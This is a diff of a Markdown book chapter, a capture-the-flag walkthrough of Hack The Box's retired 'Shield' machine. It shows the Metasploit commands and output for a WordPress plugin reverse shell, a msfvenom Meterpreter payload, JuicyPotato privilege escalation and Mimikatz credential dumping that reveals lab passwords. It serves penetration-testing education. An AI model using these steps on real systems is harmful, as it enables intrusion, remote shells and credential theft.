@@ -1,24 +1,24 @@
 # Exercise: The Shield Box with Metasploit
 
-On logging in to Hack The Box, you will be presented with lots of things you can do via the dashboard \(Figure 1-6\). In this book, we are going to focus on the Machines that are part of the Labs environment of the site. In particular we are going to stick to Retired Machines because writeups and videos discussing approaches to these challenges are public. Remember that to get access to all of the retired machines, you will need a VIP account. A machine is an actual virtual machine that is hosted on a server located in a region that is accessible via VPN connection. You should choose a region that is close to where you live in order to get the best response times from the machines. Hack The Box has a tutorial on how to get VPN access \([https://help.hackthebox.eu/getting-started/v2-introduction-to-vpn-access\](https://help.hackthebox.eu/getting-started/v2-introduction-to-vpn-access\)\). Each machine will have a unique IP address and if the machine is not started already by someone else, you can start the machine and it will run for a minimum of 24 hours. If you haven't finished in that time, you can extend the length of time the machine runs by a further period. When you are ready, you can tackle the Active Machines which are ones for which there are no public writeups or videos available and you are on your own to try and solve the challenge.
+On logging in to Hack The Box, you will be presented with lots of things you can do via the dashboard. In this book, we are going to focus on the Machines that are part of the Labs environment of the site. In particular we are going to stick to Retired Machines because writeups and videos discussing approaches to these challenges are public. Remember that to get access to all of the retired machines, you will need a VIP account. A machine is an actual virtual machine that is hosted on a server located in a region that is accessible via VPN connection. You should choose a region that is close to where you live in order to get the best response times from the machines. Hack The Box has a tutorial on how to get VPN access \([https://help.hackthebox.eu/getting-started/v2-introduction-to-vpn-access\](https://help.hackthebox.eu/getting-started/v2-introduction-to-vpn-access\)\). Each machine will have a unique IP address and if the machine is not started already by someone else, you can start the machine and it will run for a minimum of 24 hours. If you haven't finished in that time, you can extend the length of time the machine runs by a further period. When you are ready, you can tackle the Active Machines which are ones for which there are no public writeups or videos available and you are on your own to try and solve the challenge.
 
 All Hack The Box machines present the same goals, getting a user flag which is a 32 character unique hexadecimal string. Once this is obtained, you then need to get the root flag which means getting administrator privileges on the box. In our case studies, I won't explicitly talk about getting these flags although everything we do will allow you to get and submit them.
 
 ![The Hack The Box Dashboard](../.gitbook/assets/6%20%284%29.png)
 
-To get started, we are going to look at a machine called Shield in the Starting Point track. This isn't the first machine in the list but it will enable us to explore some different approaches to tackling these challenges. We will go through the standard enumeration and look for an entry point into a misconfigured WordPress site. We will do this using command line tools and through the use of the amazing Metasploit Framework.
+To get started, we are going to look at a machine called Shield in the Starting Point track. This isn't the first machine in the list but it will enable us to explore some different approaches to tackling these challenges. We will go through the standard enumeration and look for an entry point into a misconfigured WordPress site. We will do this using command line tools and through the use of the amazing **Metasploit Framework**.
 
 There will be things that you do here that haven’t been covered yet and so I ask that you bear with me and concentrate on the use of Metasploit and meterpreter shells. The other aspects will be dealt with in more detail later. I could have skipped over the initial parts but if you are still uncomfortable, go ahead and read the enumeration section and then come back.
 
 ## Setup
 
-To connect to the Starting Point machines, you need to run a VPN with the Starting Point access pack. Download the openvpn configuration file and run that using:
+To connect to the Starting Point machines, you need to run a VPN with the Starting Point access pack. Download the OpenVPN configuration file and run that using:
 
 ```bash
 sudo openvpn <username>-startingpoint.ovpn
 ```
 
-I find it convenient to add the hostname of the machine in the /etc/hosts file so that I can refer to the hostname and not have to remember the IP address. Add the hostname of the machine and associate it with its IP address:
+I find it convenient to add the hostname of the machine in the /etc/hosts file so that I can refer to the hostname and not have to remember the IP address. Add the hostname of the machine that you are targetting and associate it with its IP address:
 
 ```bash
 sudo vi /etc/hosts
@@ -30,17 +30,17 @@ and then add
 10.10.10.29 shield.htb
 ```
 
-Create a directory called Shield that you can use as the working directory for this challenge. Create a sub-directory called nmap to store the nmap results.
+Create a directory called Shield that you can use as the working directory for this challenge. Create a sub-directory called Nmap to store the Nmap results.
 
 ## Finding Open Ports and Services
 
-In starting any box on Hack The Box, the first step is to perform enumeration of the network services that the box provides. We are given the IP address of the box and so what we need to know is what ports are open and what services are running on the machines listening on those ports. We will go into networking in the next chapter and describe how services can listen on specific ports for connections from client software. Web servers for example, usually listen on ports 80 and 443. For the time being, however, just follow along without worrying too much about the detail. To scan for open ports on the box, we will use a command line tool nmap.
+In starting any box on Hack The Box, the first step is to perform enumeration of the network services that the box provides. We are given the IP address of the box and so what we need to know is what ports are open and what services are running on the machines listening on those ports. We will go into networking in the next chapter and describe how services can listen on specific ports for connections from client software. Web servers for example, usually listen on ports 80 and 443. For the time being, however, just follow along without worrying too much about the detail. To scan for open ports on the box, we will use a command line tool Nmap.
 
 ## Performing an Nmap Scan
 
 To start, add a hostname for the box and associate it with its IP address.
 
-Run an nmap scan in the terminal using the command:
+Run an Nmap scan in the terminal using the command:
 
 ```bash
 nmap -Pn -v -sC -sV -p- --min-rate=1000 -T4 shield.htb -o nmap/shield-tcp-full
@@ -48,7 +48,7 @@ nmap -Pn -v -sC -sV -p- --min-rate=1000 -T4 shield.htb -o nmap/shield-tcp-full
 
 You might see an alternative of this command which is to run an initial scan to get the open ports and then run the second command to get information about the services and versions of software. There isn't very much difference between the two approaches however and so it is easier simply to run the single script.
 
-When run, nmap will report 2 ports open, port 80 and port 3306.
+When run, Nmap will report 2 ports open, port 80 and port 3306.
 
 ```text
 PORT STATE SERVICE VERSION
@@ -70,14 +70,14 @@ The output from nmap tells us that Shield is a windows box running Microsoft IIS
 
 Continuing the enumeration, we want to discover more about the website and in particular, its directory structure and potential files in those directories. Web servers are normally configured to serve HTML and other types of files from a root directory, like /var/www/html/ for example. The root directory may have subdirectories to organize files that the website uses like stylesheets and JavaScript. Subdirectories may also be used for files that belong to other websites.
 
-To explore the subdirectories and files that a website has access to, we can use a tool called gobuster. Gobuster uses dictionaries of common words associated with directories and files and will just repeatedly try URL paths replacing the final part of the path with words from the dictionary. This process is called fuzzing and it is used in hacking to explore the effect of inputs on the outputs of a program.
+To explore the subdirectories and files that a website has access to, we can use a tool called Gobuster. Gobuster uses dictionaries of common words associated with directories and files and will just repeatedly try URL paths replacing the final part of the path with words from the dictionary. This process is called fuzzing and it is used in hacking to explore the effect of inputs on the outputs of a program.
 
-Running gobuster using the directory dictionary /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt, we discover a sub-directory of the website called wordpress indicated by the status code 301. This status code indicates to the requester that the URL has been moved permanently to another location, in this case to the URL [http://shield.htb/wordpress/](http://shield.htb/wordpress/).
+Running Gobuster using the directory dictionary /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt, we discover a sub-directory of the website called wordpress indicated by the status code 301. This status code indicates to the requester that the URL has been moved permanently to another location, in this case to the URL [http://shield.htb/wordpress/](http://shield.htb/wordpress/).
 
 ```text
  ──[rin@parrot]─[~/boxes/StartingPoint/Shield]
-└──╼ $gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
-              -u http://10.10.10.29
+└──╼ $gobuster dir -w /usr/share/wordlists/dirbuster/\
+directory-list-2.3-medium.txt -u http://10.10.10.29
 ===============================================================
 Gobuster v3.0.1
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
@@ -94,21 +94,21 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 /wordpress (Status: 301)
 ```
 
-The url [http://shield.htb/wordpress](http://shield.htb/wordpress) reveals a wordpress website called SHIELDSUP that features blog posts by a user admin. Wordpress sites by default have administration pages at the url [http://shield.htb/wordpress/wp-admin](http://shield.htb/wordpress/wp-admin). you already know a user admin and from a previous machine in the StartingPoint series, you would have discovered the password P@s5w0rd!. Trying this with the user admin gets us in.
+The url [http://shield.htb/wordpress](http://shield.htb/wordpress) reveals a wordpress website called SHIELDSUP that features blog posts by a user admin. Wordpress sites by default have administration pages at the url [http://shield.htb/wordpress/wp-admin](http://shield.htb/wordpress/wp-admin). You already know a user admin and from a previous machine in the StartingPoint series, you would have discovered the password **P@s5w0rd!**. Trying this with the user admin gets us in.
 
 ## Launching a Meterpreter Reverse Shell
 
 The objective of the challenge is to gain access to the box to explore and hopefully discover more vulnerabilities that can be exploited to gain further privilege and access. This means getting control of user accounts that give progressively more access until we get to be the administrator of the box. Initial access usually refers to gaining a shell as one of these users. A shell is a program that allows a user the ability to type commands and display results.
 
-On Windows it is the **cmd.exe** program, on Linux it is bash or zsh that runs in the terminal program. We have been using a shell on our Parrot box to carry out all of the actions we have taken so far. When a shell is run locally on a box, it is a local shell. Remote shells are those that are accessed over a network connection so that the commands are typed on the local attacker box but run on the remote machine. We can set up a remote shell by running a program on our local Parrot box which listens for connections and then run a program on the remote machine that connects back to the listener and establishes the remote shell session. This is called a reverse shell.
+On Windows it is the **cmd.exe** program, on Linux it is **Bash** or **Zsh** that runs in the terminal program. We have been using a shell on our Parrot box to carry out all of the actions we have taken so far. When a shell is run locally on a box, it is a local shell. Remote shells are those that are accessed over a network connection so that the commands are typed on the local attacker box but run on the remote machine. We can set up a remote shell by running a program on our local Parrot box which listens for connections and then run a program on the remote machine that connects back to the listener and establishes the remote shell session. This is called a reverse shell.
 
-We will explore all of this in more detail in the next chapter, but for the moment, we are going to get a reverse shell using Meterpreter. Time to turn to Metasploit which has a way of launching a meterpreter reverse shell in PHP! Start Metasploit by selecting it from the menu or by running
+We will explore all of this in more detail in the next chapter, but for the moment, we are going to get a reverse shell using **Meterpreter**. Time to turn to **Metasploit** which has a way of launching a **Meterpreter** reverse shell in **PHP**! Start **Metasploit** by selecting it from the menu or by running
 
 ```bash
 sudo msfconsole-start
 ```
 
-In Metasploit, we are going to use an existing exploit of the WordPress administrator account by uploading a plugin to WordPress that is actually a reverse shell. Plugins, as we see later when we craft our own custom plugin, are ways of packaging PHP code to add functionality to WordPress. The security vulnerability with this is that this code has access to do whatever the user account that is running WordPress can do. There is nothing limiting what code in plugins can do normally. In the case of this exploit, we use the command:
+In **Metasploit**, we are going to use an existing exploit of the WordPress administrator account by uploading a plugin to **WordPress** that is actually a reverse shell. Plugins, as we see later when we craft our own custom plugin, are ways of packaging **PHP** code to add functionality to **WordPress**. The security vulnerability with this is that this code has access to do whatever the user account that is running WordPress can do. There is nothing limiting what code in plugins can do normally. In the case of this exploit, we use the command:
 
 ```bash
 use exploit/unix/webapp/wp_admin_shell_upload
@@ -126,7 +126,7 @@ set RHOSTS 10.10.10.29
 set LHOST 10.10.14.2
 ```
 
-LHOST is the IP address of your attacker machine which you can get using the command “ifconfig”. After doing that, the options should look as follows:
+**LHOST** is the IP address of your attacker machine which you can get using the command “ifconfig”. After doing that, the options should look as follows:
 
 ```text
 msf6 exploit(unix/webapp/wp_admin_shell_upload) > options
@@ -149,7 +149,7 @@ Payload options (php/meterpreter/reverse_tcp):
  LPORT 4444 yes The listen port
 ```
 
-All that remains is to type “run”. The exploit consists of uploading a plugin that consists of a php page and then calling that page. This executes a staged meterpreter reverse shell. The output should be something like:
+All that remains is to type “run”. The exploit consists of uploading a plugin that consists of a php page and then calling that page. This executes a staged **Meterpreter** reverse shell. The output should be something like:
 
 ```text
 msf6 exploit(unix/webapp/wp_admin_shell_upload) > run
@@ -171,7 +171,7 @@ meterpreter >
 
 ## Upgrading the Meterpreter Reverse Shell
 
-That gives us a meterpreter shell that is a little unstable and also, because it is written in PHP, somewhat limited in its abilities. We are going to generate a better meterpreter shell using a program called msfvenom. To start with we can use msfvenom to generate a Windows executable program that will run the meterpreter reverse shell. To do this, we need to exit from the meterpreter session by typing bg and then hit return.
+That gives us a Meterpreter shell that is a little unstable and also, because it is written in PHP, somewhat limited in its abilities. We are going to generate a better meterpreter shell using a program called msfvenom. To start with we can use msfvenom to generate a Windows executable program that will run the meterpreter reverse shell. To do this, we need to exit from the meterpreter session by typing _**bg**_ and then hit return.
 
 Then we can type
 
@@ -193,7 +193,7 @@ Final size of exe file: 206848 bytes
 If you have problems running msfvenom within Metasploit, you can run it from the command line in bash
 {% endhint %}
 
-Once the payload is created, we can upload it to the Shield machine.  We need to get back into the current meterpreter session first. We do that with the sessions command. Just typing sessions will list the current sessions available. We can interact with a session using the sessions -i &lt;session number&gt; command:
+Once the payload is created, we can upload it to the Shield machine.  We need to get back into the current **Meterpreter** session first. We do that with the sessions command. Just typing sessions will list the current sessions available. We can interact with a session using the **sessions -i &lt;session number&gt; command**:
 
 ```bash
 msf6 exploit(unix/webapp/wp_admin_shell_upload) > sessions
@@ -251,8 +251,8 @@ Active sessions
 ===============
  Id Name Type Information Connection
  -- ---- ---- ----------- ----------
- 1 meterpreter php/windows IUSR (0) @ SHIELD 10.10.14.3:4444 -> 10.10.10.29:56134 
-                                                                (10.10.10.29)
+ 1 meterpreter php/windows IUSR (0) @ SHIELD 10.10.14.3:4444 -> 
+ 10.10.10.29:56134 (10.10.10.29)
 msf6 exploit(multi/handler) > sessions -i 1
 [*] Starting interaction with 1...
 meterpreter >
@@ -263,8 +263,8 @@ We can then just execute the meterpreter reverse shell by executing revshell.exe
 ```text
 meterpreter > execute -f revshell.exe
 Process 3280 created.
-meterpreter > [*] Meterpreter session 2 opened (10.10.14.3:6001 -> 
-                                10.10.10.29:56135) at 2020-10-08 14:10:38 +0800
+meterpreter > [*] Meterpreter session 2 opened (10.10.14.3:6001 ->     
+    10.10.10.29:56135) at 2020-10-08 14:10:38 +0800
 meterpreter > bg
 [*] Backgrounding session 1...
 msf6 exploit(multi/handler) > sessions -i 2
@@ -272,13 +272,13 @@ msf6 exploit(multi/handler) > sessions -i 2
 meterpreter >
 ```
 
-We are now in a new, more powerful meterpreter session and typing help will show more commands than were available with the php meterpreter shell \(not all shells are equal\). You can verify this by typing help at the meterpreter command and seeing the range of commands available.
+We are now in a new, more powerful Meterpreter session and typing help will show more commands than were available with the PHP Meterpreter shell \(not all shells are equal\). You can verify this by typing help at the Meterpreter command and seeing the range of commands available.
 
 ## Discovery and Privilege Escalation
 
-Now that we have achieved initial access, the process of further enumeration or discovery takes place. We are looking for ways of elevating our user account to administrator and gain total ownership of the box. This process is called privilege escalation or priv esc for short.
+Now that we have achieved initial access, the process of further enumeration or discovery takes place. We are looking for ways of elevating our user account to administrator and gain total ownership of the box. This process is called **privilege escalation** or **priv esc** for short.
 
-In Metasploit, you can run a command that will look for particular vulnerabilities that will lead to privilege escalation. This command is the “local\_exploit\_suggester”
+In **Metasploit**, you can run a command that will look for particular vulnerabilities that will lead to privilege escalation. This command is the “**local\_exploit\_suggester**”
 
 ```text
 meterpreter > bg
@@ -324,19 +324,19 @@ Add this instead   --> return CheckCode::Safe("No target for win32k.sys
 ```
 
   
-restart metasploit after this.
+restart Metasploit after this.
 {% endhint %}
 
-From experience, I know that the most promising exploit is going to be ms16\_075\_reflection\_juicy which is the JuicyPotato exploit. This vulnerability allows for privilege escalation through impersonation of the System user. It occurs if the user doing the exploit has certain privileges, notable the SeImpersonate privilege. Unfortunately, the Metasploit module doesn’t work as is and so you have to do this manually by downloading JuicyPotato.exe from [https://github.com/ohpe/juicy-potato/releases/tag/v0.1](https://github.com/ohpe/juicy-potato/releases/tag/v0.1)
+From experience, I know that the most promising exploit is going to be _**ms16\_075\_reflection\_juicy**_ which is the _**JuicyPotato**_ exploit. This vulnerability allows for privilege escalation through impersonation of the System user. It occurs if the user doing the exploit has certain privileges, notable the _**SeImpersonate**_ privilege. Unfortunately, the _**Metasploit**_ module doesn’t work as is and so you have to do this manually by downloading _**JuicyPotato.exe**_ from [https://github.com/ohpe/juicy-potato/releases/tag/v0.1](https://github.com/ohpe/juicy-potato/releases/tag/v0.1)
 
-We can run another handler as before and then upload JuicyPotato.exe. One more step however as executing it from the meterpreter prompt doesn’t work. So you can drop into a cmd.exe shell prompt by typing “shell”. From the command prompt, you can then run the JuicyPotato.exe
+We can run another handler as before and then upload _**JuicyPotato.exe**_. One more step however as executing it from the Meterpreter prompt doesn’t work. So you can drop into a _**cmd.exe**_ shell prompt by typing “_**shell**_”. From the command prompt, you can then run the _**JuicyPotato.exe**_
 
 ```bash
 JuicyPotato.exe -t * -p ^
 C:\inetpub\wwwroot\wordpress\wp-content\plugins\dBPEarcLsr\revshell.exe -l 1337
 ```
 
-Remember to change the path of the revshell.exe to the actual path name Meterpreter has used. When JuicyPotato.exe runs, it will start another meterpreter session but as the privileged user that the exploit has impersonated, NT AUTHORITY\SYSTEM. From there, you can cd \(change directory\) into the c:\Users\Administrator directory and find the flag.
+Remember to change the path of the _**revshell.exe**_ to the actual path name _**Meterpreter**_ has used. When _**JuicyPotato.exe**_ runs, it will start another _**Meterpreter**_ session but as the privileged user that the exploit has impersonated, _**NT AUTHORITY\SYSTEM**_. From there, you can cd \(change directory\) into the **c:\Users\Administrator\Desktop** directory and find the flag.
 
 ```bash
 meterpreter > shell
@@ -369,12 +369,12 @@ Server username: NT AUTHORITY\SYSTEM
 
 Now that we have administrator privileges, we can do some more discovery to look for any other useful information on the box, in particular, other user accounts and their passwords.
 
-We will come back to this later in the book and deal with it in more details but what you will do is take advantage of a module that Meterpreter allows us to run called “kiwi” that is the module that runs “mimikatz” commands. Mimikatz is a program that has been designed to search for and collect credentials on Windows from a number of different places where these are commonly stored. These include the two main sources:
+We will come back to this later in the book and deal with it in more details but what you will do is take advantage of a module that _**Meterpreter**_ allows us to run called _**kiwi**_ that is the module that runs _**Mimikatz**_ commands. _**Mimikatz**_ is a program that has been designed to search for and collect credentials on Windows from a number of different places where these are commonly stored. These include the two main sources:
 
-* Passwords stored in memory. mimikatz looks for passwords that may be in the memory of the Local Security Authority Subsystem Service \(LSASS\) process
+* Passwords stored in memory. _**Mimikatz**_ looks for passwords that may be in the memory of the _**Local Security Authority Subsystem Service**_ \(_**LSASS**_\) process
 * Kerberos: Using an API to access Kerberos credentials \(tickets\) again from memory
 
-To run kiwi, you type “load kiwi” and then “creds\_all”. From this, you can see the user “sandra” has the password “Password1234!” which has been extracted from Kerberos running on the machine.
+To run _**Kiwi**_, you type “load kiwi” and then “creds\_all”. From this, you can see the user “sandra” has the password “Password1234!” which has been extracted from Kerberos running on the machine.
 
 ```text
 meterpreter > creds_all
